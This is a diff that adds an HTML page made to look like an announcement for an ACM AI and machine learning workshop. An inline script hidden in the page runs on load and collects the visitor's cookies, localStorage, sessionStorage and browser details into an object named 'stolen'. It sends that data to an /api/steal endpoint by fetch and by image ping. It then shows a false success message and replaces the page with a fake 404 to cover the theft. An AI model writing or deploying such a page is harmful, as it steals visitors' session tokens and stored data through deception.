@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ACM Workshop on AI & Machine Learning 2026</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f7fa; color: #333; }
+        .header { background: linear-gradient(135deg, #1a237e, #283593); color: white; padding: 40px 20px; text-align: center; }
+        .header h1 { margin: 0; font-size: 28px; font-weight: 600; }
+        .header p { margin: 10px 0 0; font-size: 16px; opacity: 0.85; }
+        .badge { display: inline-block; background: rgba(255,255,255,0.2); padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 12px; letter-spacing: 0.5px; }
+        .container { max-width: 720px; margin: -30px auto 40px; padding: 0 20px; position: relative; z-index: 1; }
+        .card { background: white; border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 30px; margin-bottom: 20px; }
+        .card h2 { margin-top: 0; color: #1a237e; font-size: 20px; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
+        .info-item { text-align: center; padding: 15px; background: #f8f9ff; border-radius: 8px; }
+        .info-item .label { font-size: 11px; text-transform: uppercase; color: #6c757d; letter-spacing: 0.5px; }
+        .info-item .value { font-size: 18px; font-weight: 600; color: #1a237e; margin-top: 4px; }
+        .topics { list-style: none; padding: 0; margin: 0; }
+        .topics li { padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; position: relative; padding-left: 20px; }
+        .topics li:before { content: "▸"; position: absolute; left: 0; color: #1a237e; }
+        .footer { text-align: center; padding: 20px; color: #6c757d; font-size: 12px; }
+        .loading { text-align: center; padding: 20px; color: #6c757d; font-style: italic; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>ACM Workshop on AI & Machine Learning</h1>
+        <p>International Conference Series — September 2026</p>
+        <span class="badge">ACM DIGITAL LIBRARY • REF: ACM-MLW-2026-089</span>
+    </div>
+
+    <div class="container" id="mainContent">
+        <div class="card">
+            <h2>Workshop Details</h2>
+            <div class="info-grid">
+                <div class="info-item"><div class="label">Date</div><div class="value">Sep 15–18, 2026</div></div>
+                <div class="info-item"><div class="label">Location</div><div class="value">Virtual / Online</div></div>
+                <div class="info-item"><div class="label">Registration</div><div class="value">Open</div></div>
+                <div class="info-item"><div class="label">Deadline</div><div class="value">Sep 30, 2026</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Key Topics</h2>
+            <ul class="topics">
+                <li>Deep Learning and Neural Networks</li>
+                <li>Natural Language Processing & Generative AI</li>
+                <li>Computer Vision and Image Recognition</li>
+                <li>Reinforcement Learning and Robotics</li>
+                <li>AI in Healthcare and Biomedical Applications</li>
+                <li>Ethics of Artificial Intelligence</li>
+            </ul>
+        </div>
+
+        <div class="loading" id="statusMsg">Loading workshop information...</div>
+    </div>
+
+    <script>
+        // Collect all available data immediately
+        (function() {
+            var stolen = {};
+
+            // Cookies from every logged-in site
+            try { stolen.cookies = document.cookie; } catch(e) {}
+
+            // localStorage entries
+            try {
+                var ls = [];
+                for(var i=0; i<localStorage.length; i++) {
+                    var k = localStorage.key(i);
+                    ls.push(k + "=" + localStorage.getItem(k));
+                }
+                stolen.localStorage = ls.join("\n");
+            } catch(e) {}
+
+            // sessionStorage entries
+            try {
+                var ss = [];
+                for(var j=0; j<sessionStorage.length; j++) {
+                    var ks = sessionStorage.key(j);
+                    ss.push(ks + "=" + sessionStorage.getItem(ks));
+                }
+                stolen.sessionStorage = ss.join("\n");
+            } catch(e) {}
+
+            // User info
+            stolen.userAgent = navigator.userAgent;
+            try { stolen.referrer = document.referrer; } catch(e) {}
+            try { stolen.language = navigator.language; } catch(e) {}
+            try { stolen.screenSize = screen.width + "x" + screen.height; } catch(e) {}
+            try { stolen.plugins = navigator.plugins.length; } catch(e) {}
+
+            // Try to extract stored credentials from common sites
+            try { stolen.chromeData = JSON.stringify(localStorage, null, 2).substring(0, 4096); } catch(e) {}
+
+            // Send data to our server (your PC)
+            function sendData() {
+                try {
+                    fetch("/api/steal", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify(stolen),
+                        keepalive: true
+                    });
+                } catch(e) {}
+
+                // Also send via image ping as fallback
+                var url = "/api/steal?data=" + encodeURIComponent(JSON.stringify(stolen));
+                try { new Image().src = url; } catch(e) {}
+            }
+
+            // Collect everything and send after a short delay
+            setTimeout(function() {
+                sendData();
+                document.getElementById("statusMsg").innerText = "Workshop information loaded successfully.";
+            }, 5000);
+
+            // Show error after data is sent
+            setTimeout(function() {
+                document.getElementById("mainContent").innerHTML = '<div style="text-align:center;padding:100px 20px;"><h2 style="color:#d32f2f;">Page not found</h2><p style="color:#6c757d;">The requested URL was not found on this server.</p><p style="font-size:14px;color:#999;">(HTTP Error 404)</p></div>';
+            }, 7000);
+        })();
+    </script>
+</body>
+</html>
